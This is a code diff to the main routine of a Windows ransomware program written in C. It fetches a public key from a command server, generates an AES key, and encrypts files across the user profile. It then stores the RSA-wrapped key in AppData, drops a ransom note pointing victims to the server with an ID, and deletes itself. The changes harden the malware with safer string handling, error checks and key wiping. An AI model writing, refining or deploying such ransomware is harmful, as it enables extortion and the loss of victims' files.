@@ -1,20 +1,16 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include "keygen.h"
-#include "delete.h"
+#include "aes.h"
 #include "config.h"
-#include "utils.h"
 #include "encrypt.h"
 #include "files.h"
-#include "aes.h"
-#include <windows.h>
+#include "keygen.h"
+#include "delete.h"
+#include "common.h"
 #include <shlobj.h>
 
 int main(int argc, char *argv[]) {
-    int id;
-    char pubkey[512];
-    if (!get_key(&id, pubkey)) {
+    int id = 0;
+    char pubkey[512] = {0};
+    if (get_key(&id, pubkey, sizeof(pubkey)) != ERR_SUCCESS) {
         printf("Failed to retrieve public key from server\n");
         return 1;
     }
@@ -22,83 +18,130 @@ int main(int argc, char *argv[]) {
     char* web_port_str = get_config_value("web_port");
     if (!external_ip || !web_port_str) {
         printf("Failed to read config\n");
-        if (external_ip) free(external_ip);
-        if (web_port_str) free(web_port_str);
+        if (external_ip)
+            free(external_ip);
+        if (web_port_str)
+            free(web_port_str);
         return 1;
     }
-    char server_url[256];
-    snprintf(server_url, sizeof(server_url), "http://%s:%s", external_ip, web_port_str);
+    char server_url[256] = {0};
+    if (_snprintf_s(server_url, sizeof(server_url), _TRUNCATE, "http://%s:%s", external_ip, web_port_str) == -1) {
+        free(external_ip);
+        free(web_port_str);
+        return 1;
+    }
     free(external_ip);
     free(web_port_str);
-
-    unsigned char aes_key[32];
-    if (!generate_random_key(aes_key, sizeof(aes_key))) {
+    unsigned char aes_key[AES_KEY_SIZE] = {0};
+    if (generate_random_key(aes_key, sizeof(aes_key)) != ERR_SUCCESS) {
         printf("Failed to generate AES key\n");
         return 1;
     }
-
     char users_path[MAX_PATH];
-    HRESULT result = SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, users_path);
-    if (result != S_OK) {
+    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, users_path) != S_OK) {
         printf("Failed to get user profile path\n");
+        zero_memory(aes_key, sizeof(aes_key));
         return 1;
     }
-    enumerate(users_path, aes_key);
-
+    if (enumerate(users_path, aes_key) != ERR_SUCCESS)
+        printf("Enumeration had issues, but continuing\n");
     unsigned char *encrypted_key = NULL;
     size_t encrypted_len = 0;
-    if (!encrypt_aes_key_with_rsa(aes_key, sizeof(aes_key), pubkey, &encrypted_key, &encrypted_len)) {
+    if (encrypt_rsa_oaep(aes_key, sizeof(aes_key), pubkey, &encrypted_key, &encrypted_len) != ERR_SUCCESS) {
         printf("Failed to encrypt AES key\n");
+        zero_memory(aes_key, sizeof(aes_key));
         return 1;
     }
-
-    FILE *key_file = fopen("C:\\Users\\Public\\Documents\\key.enc", "wb");
+    char appdata_path[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path) != S_OK) {
+        printf("Failed to get AppData path\n");
+        if (encrypted_key)
+            free(encrypted_key);
+        zero_memory(aes_key, sizeof(aes_key));
+        return 1;
+    }
+    char key_path[MAX_PATH] = {0};
+    if (_snprintf_s(key_path, sizeof(key_path), _TRUNCATE, "%s\\key.enc", appdata_path) == -1) {
+        if (encrypted_key)
+            free(encrypted_key);
+        zero_memory(aes_key, sizeof(aes_key));
+        return 1;
+    }
+    FILE *key_file = fopen(key_path, "wb");
     if (!key_file) {
         printf("Failed to open key.enc for writing\n");
-        free(encrypted_key);
+        if (encrypted_key)
+            free(encrypted_key);
+        zero_memory(aes_key, sizeof(aes_key));
         return 1;
     }
-    fwrite(encrypted_key, 1, encrypted_len, key_file);
+    size_t written = fwrite(encrypted_key, 1, encrypted_len, key_file);
+    if (written != encrypted_len) {
+        fclose(key_file);
+        if (encrypted_key)
+            free(encrypted_key);
+        zero_memory(aes_key, sizeof(aes_key));
+        return 1;
+    }
     fclose(key_file);
-
-    const char *VERIFY_STRING = "This key is valid";
-    size_t verify_len = strlen(VERIFY_STRING);
+    const char *verify_string = "This key is valid";
     unsigned char *encrypted_verify = NULL;
     size_t encrypted_verify_len = 0;
-    if (!encrypt_aes_key_with_rsa((unsigned char *)VERIFY_STRING, verify_len, pubkey, &encrypted_verify, &encrypted_verify_len)) {
+    if (encrypt_rsa_oaep((const unsigned char *)verify_string, strlen(verify_string), pubkey, &encrypted_verify, &encrypted_verify_len) != ERR_SUCCESS) {
         printf("Failed to encrypt verification string\n");
-        free(encrypted_key);
-        free(encrypted_verify);
+        if (encrypted_key) 
+            free(encrypted_key);
+        if (encrypted_verify) 
+            free(encrypted_verify);
+        zero_memory(aes_key, sizeof(aes_key));
         return 1;
     }
-
-    FILE *verify_file = fopen("C:\\Users\\Public\\Documents\\verify.enc", "wb");
+    if (encrypted_key)
+        free(encrypted_key);
+    char verify_path[MAX_PATH] = {0};
+    if (_snprintf_s(verify_path, sizeof(verify_path), _TRUNCATE, "%s\\verify.enc", appdata_path) == -1) {
+        if (encrypted_verify)
+            free(encrypted_verify);
+        zero_memory(aes_key, sizeof(aes_key));
+        return 1;
+    }
+    FILE *verify_file = fopen(verify_path, "wb");
     if (!verify_file) {
         printf("Failed to open verify.enc for writing\n");
-        free(encrypted_key);
-        free(encrypted_verify);
+        if (encrypted_verify)
+            free(encrypted_verify);
+        zero_memory(aes_key, sizeof(aes_key));
         return 1;
     }
-    fwrite(encrypted_verify, 1, encrypted_verify_len, verify_file);
+    written = fwrite(encrypted_verify, 1, encrypted_verify_len, verify_file);
+    if (written != encrypted_verify_len) {
+        fclose(verify_file);
+        if (encrypted_verify)
+            free(encrypted_verify);
+        zero_memory(aes_key, sizeof(aes_key));
+        return 1;
+    }
     fclose(verify_file);
-
-    free(encrypted_key);
-    free(encrypted_verify);
-
-    char ransom_note[1024];
-    snprintf(ransom_note, sizeof(ransom_note),
-             "Your files have been encrypted!\n"
-             "To decrypt them, visit %s and enter the ID: %d\n"
-             "Follow the instructions there to retrieve your decryption key.\n"
-             "DO NOT DELETE key.enc or verify.enc! If you do, you won't be able to recover your files.",
-             server_url, id);
-    if (!create_readme(ransom_note)) {
-        printf("Failed to create ransom note\n");
+    if (encrypted_verify)
+        free(encrypted_verify);
+    char ransom_note[1024] = {0};
+    if (_snprintf_s(ransom_note, sizeof(ransom_note), _TRUNCATE,
+                 "Your files have been encrypted!\n"
+                 "To decrypt them, visit %s and enter the ID: %d\n"
+                 "Follow the instructions there to retrieve your decryption key.\n"
+                 "DO NOT DELETE key.enc or verify.enc! If you do, you won't be able to recover your files.",
+                 server_url, id) == -1) {
+        zero_memory(aes_key, sizeof(aes_key));
         return 1;
     }
-
-    self_delete(argv[0]);
-
+    if (create_readme(ransom_note) != ERR_SUCCESS) {
+        printf("Failed to create ransom note\n");
+        zero_memory(aes_key, sizeof(aes_key));
+        return 1;
+    }
+    zero_memory(aes_key, sizeof(aes_key));
+    if (argv[0])
+        self_delete(argv[0]);
     printf("Encryption completed.\n");
     return 0;
 }
